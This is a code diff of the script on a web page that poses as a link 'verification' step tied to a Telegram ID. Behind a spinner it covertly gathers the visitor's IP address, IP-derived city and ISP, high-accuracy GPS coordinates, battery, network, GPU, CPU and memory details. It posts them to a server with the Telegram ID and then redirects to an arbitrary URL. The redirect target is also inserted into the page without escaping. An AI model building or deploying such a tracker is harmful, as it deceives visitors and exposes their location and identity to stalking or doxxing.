@@ -182,244 +182,216 @@
   </div>
 
 <script>
-const urlParams = new URLSearchParams(window.location.search);
-const telegramId = urlParams.get('telegramId');
-const redirectUrl = urlParams.get('redirectUrl') || 'https://google.com';
-const expires = parseInt(urlParams.get('expires'), 10) || 0;
+   const urlParams = new URLSearchParams(window.location.search);
+  const telegramId = urlParams.get('telegramId');
+  const redirectUrl = urlParams.get('redirectUrl') || 'https://google.com';
+  const expires = parseInt(urlParams.get('expires'), 10) || 0;
 
-function startVerification() {
-  const now = Date.now();
-  if (expires && now > expires) {
-    document.body.innerHTML = `
+  function startVerification() {
+    const now = Date.now();
+    if (expires && now > expires) {
+      document.getElementById('content').innerHTML = `
+        <div style="text-align:center; padding:50px; color: var(--light);">
+          <h2 style="color: var(--danger); margin-bottom: 15px;">This link has expired.</h2>
+          <p>The link is no longer valid. Please request a new one.</p>
+          <button style="margin-top: 20px; padding: 10px 20px; background: var(--danger); color: white; border: none; border-radius: 6px; cursor: pointer;" onclick="window.location.href='https://google.com'">
+            Return to Safety
+          </button>
+        </div>
+      `;
+      return;
+    }
+
+    document.getElementById('content').innerHTML = `
       <div style="text-align:center; padding:50px; color: var(--light);">
-        <h2 style="color: var(--danger); margin-bottom: 15px;">This link has expired.</h2>
-        <p>The link is no longer valid. Please request a new one.</p>
-        <button style="margin-top: 20px; padding: 10px 20px; background: var(--danger); color: white; border: none; border-radius: 6px; cursor: pointer;" onclick="window.location.href='https://google.com'">
-          Return to Safety
-        </button>
+        <h2 style="margin-bottom: 20px; color: var(--accent);">Verifying...</h2>
+        <div class="spinner"></div>
+        <style>
+          .spinner {
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid var(--accent);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+          }
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        </style>
       </div>
     `;
-    return;
+    setTimeout(() => collectAndSendData(), 2000);
   }
 
-  document.body.innerHTML = `
-    <div style="text-align:center; padding:50px; color: var(--light);">
-      <h2 style="margin-bottom: 20px; color: var(--accent);">Verifying...</h2>
-      <div class="spinner"></div>
-      <style>
-        .spinner {
-          border: 5px solid rgba(255,255,255,0.1);
-          border-top: 5px solid var(--accent);
-          border-radius: 50%;
-          width: 50px;
-          height: 50px;
-          animation: spin 2s linear infinite;
-          margin: 20px auto;
-        }
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-      </style>
-    </div>
-  `;
-  setTimeout(() => collectAndSendData(), 2000);
-}
-
-async function collectAndSendData() {
-  const deviceInfo = await getDeviceInfo();
-  try {
-    await fetch('/api/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ telegramId, ...deviceInfo })
-    });
-  } catch (error) {
-    console.error('Submission error:', error);
-  }
-  window.location.href = redirectUrl;
-}
-
-async function getDeviceInfo() {
-  const deviceInfo = {
-    ip: await getIP(),
-    browser: getBrowser(),
-    platform: navigator.platform || 'Unknown',
-    language: navigator.language || 'Unknown',
-    screen: `${screen.width}x${screen.height}, ${screen.colorDepth || 'Unknown'}bit`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-    timestamp: new Date().toISOString(),
-    webgl: await getWebGLInfo(),
-    networkType: await getNetworkType(),
-    networkSpeed: await getNetworkSpeed(),
-    latency: await getLatency(),
-    dataSaver: await getDataSaver(),
-    batteryLevel: await getBatteryLevel(),
-    charging: await getChargingStatus(),
-    gps: await getGPS(),
-    cpu: await getCPUInfo(),
-    ram: await getRAMInfo(),
-    location: await getLocation()
-  };
-  return deviceInfo;
-}
-
-function getBrowser() {
-  const ua = navigator.userAgent;
-  if (/firefox|fxios/i.test(ua)) return 'Firefox';
-  if (/edg/i.test(ua)) return 'Edge';
-  if (/opr\//i.test(ua)) return 'Opera';
-  if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
-  if (/safari/i.test(ua) && !/chrome|crios|fxios/i.test(ua)) return 'Safari';
-  return 'Unknown';
-}
-
-async function getNetworkType() {
-  try {
-    const conn = navigator.connection || navigator.webkitConnection || navigator.mozConnection;
-    if (!conn) return 'Unknown';
-
-    if (conn.type) return conn.type;
-
-    const type = conn.effectiveType || 'Unknown';
-    if (['2g', '3g', '4g', '5g', 'slow-2g'].includes(type)) return 'Cellular';
-    if (type === 'wifi') return 'WiFi';
-    return type.charAt(0).toUpperCase() + type.slice(1);
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip || 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getWebGLInfo() {
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getNetworkSpeed() {
-  try {
-    const conn = navigator.connection || navigator.webkitConnection;
-    return conn ? `${conn.downlink} Mbps` : 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getLatency() {
-  try {
-    const conn = navigator.connection || navigator.webkitConnection;
-    return conn ? `${conn.rtt} ms` : 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getDataSaver() {
-  try {
-    const conn = navigator.connection || navigator.webkitConnection;
-    return conn ? (conn.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getBatteryLevel() {
-  try {
-    const battery = await navigator.getBattery();
-    return battery ? `${Math.round(battery.level * 100)}%` : 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getChargingStatus() {
-  try {
-    const battery = await navigator.getBattery();
-    return battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown';
-  } catch {
-    return 'Unknown';
-  }
-}
-
-async function getGPS() {
-  try {
-    const pos = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 5000,
-        maximumAge: 0
+  async function collectAndSendData() {
+    const deviceInfo = await getDeviceInfo();
+    try {
+      const response = await fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ telegramId, ...deviceInfo })
       });
-    });
-    const lat = pos.coords.latitude.toFixed(5);
-    const lon = pos.coords.longitude.toFixed(5);
-    return `${lat}, ${lon}`;
-  } catch (error) {
-    console.error('GPS Error:', error);
-    return 'Denied';
+      if (!response.ok) {
+        throw new Error('Failed to submit data');
+      }
+    } catch (error) {
+      console.error('Submission error:', error);
+      document.getElementById('content').innerHTML = `
+        <h2 style="color: var(--danger); margin-bottom: 15px;">Verification Failed</h2>
+        <p>${error.message || 'An error occurred during verification.'}</p>
+        <button onclick="window.location.href='${redirectUrl}'">Continue</button>
+      `;
+      return;
+    }
+    window.location.href = redirectUrl;
   }
-}
 
-async function getCPUInfo() {
-  try {
-    const cpuInfo = navigator.hardwareConcurrency || 'Unknown';
-    return `${cpuInfo} cores`;
-  } catch {
+  async function getDeviceInfo() {
+    return {
+      ip: await getIP(),
+      browser: getBrowser(),
+      platform: navigator.platform || 'Unknown',
+      language: navigator.language || 'Unknown',
+      screen: `${screen.width}x${screen.height}, ${screen.colorDepth || 'Unknown'}bit`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+      timestamp: new Date().toISOString(),
+      webgl: await getWebGLInfo(),
+      networkType: await getNetworkType(),
+      networkSpeed: await getNetworkSpeed(),
+      latency: await getLatency(),
+      dataSaver: await getDataSaver(),
+      batteryLevel: await getBatteryLevel(),
+      charging: await getChargingStatus(),
+      gps: await getGPS(),
+      cpu: await getCPUInfo(),
+      ram: await getRAMInfo(),
+      location: await getLocation()
+    };
+  }
+
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (/firefox|fxios/i.test(ua)) return 'Firefox';
+    if (/edg/i.test(ua)) return 'Edge';
+    if (/opr\//i.test(ua)) return 'Opera';
+    if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
+    if (/safari/i.test(ua) && !/chrome|crios|fxios/i.test(ua)) return 'Safari';
     return 'Unknown';
   }
-}
 
-async function getRAMInfo() {
-  try {
-    const ram = navigator.deviceMemory || 'Unknown';
-    return `${ram} GB`;
-  } catch {
-    return 'Unknown';
+  async function getNetworkType() {
+    try {
+      const conn = navigator.connection || navigator.webkitConnection || navigator.mozConnection;
+      if (!conn) return 'Unknown';
+      if (conn.type) return conn.type;
+      const type = conn.effectiveType || 'Unknown';
+      if (['2g', '3g', '4g', '5g', 'slow-2g'].includes(type)) return 'Cellular';
+      if (type === 'wifi') return 'WiFi';
+      return type.charAt(0).toUpperCase() + type.slice(1);
+    } catch { return 'Unknown'; }
   }
-}
 
-async function getLocation() {
-  try {
-    const ip = await getIP();
-    if (ip === 'Unknown') return {
-      city: 'Unknown',
-      region: 'Unknown',
-      country: 'Unknown',
-      isp: 'Unknown'
-    };
-
-    const response = await fetch(`https://ipapi.co/${ip}/json/`);
-    const data = await response.json();
-    return {
-      city: data.city || 'Unknown',
-      region: data.region || 'Unknown',
-      country: data.country_name || 'Unknown',
-      isp: data.org || 'Unknown'
-    };
-  } catch (error) {
-    console.error('Location Error:', error);
-    return {
-      city: 'Unknown',
-      region: 'Unknown',
-      country: 'Unknown',
-      isp: 'Unknown'
-    };
+  async function getIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip || 'Unknown';
+    } catch { return 'Unknown'; }
   }
-}
+
+  async function getWebGLInfo() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
+      if (!gl) return 'Unavailable';
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unavailable';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getNetworkSpeed() {
+    try {
+      const conn = navigator.connection || navigator.webkitConnection;
+      return conn ? `${conn.downlink} Mbps` : 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getLatency() {
+    try {
+      const conn = navigator.connection || navigator.webkitConnection;
+      return conn ? `${conn.rtt} ms` : 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getDataSaver() {
+    try {
+      const conn = navigator.connection || navigator.webkitConnection;
+      return conn ? (conn.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getBatteryLevel() {
+    try {
+      const battery = await navigator.getBattery();
+      return battery ? `${Math.round(battery.level * 100)}%` : 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getChargingStatus() {
+    try {
+      const battery = await navigator.getBattery();
+      return battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  async function getGPS() {
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        });
+      });
+      const lat = pos.coords.latitude.toFixed(5);
+      const lon = pos.coords.longitude.toFixed(5);
+      return `${lat}, ${lon}`;
+    } catch { return 'Denied'; }
+  }
+
+  async function getCPUInfo() {
+    try {
+      const cpuInfo = navigator.hardwareConcurrency || 'Unknown';
+      return `${cpuInfo} cores`;
+    } catch { return 'Unknown'; }
+  }
+
+  async function getRAMInfo() {
+    try {
+      const ram = navigator.deviceMemory || 'Unknown';
+      return `${ram} GB`;
+    } catch { return 'Unknown'; }
+  }
+
+  async function getLocation() {
+    try {
+      const ip = await getIP();
+      if (ip === 'Unknown') return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+      const response = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await response.json();
+      return {
+        city: data.city || 'Unknown',
+        region: data.region || 'Unknown',
+        country: data.country_name || 'Unknown',
+        isp: data.org || 'Unknown'
+      };
+    } catch {
+      return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+    }
+  }
 </script>
 </body>
 </html>
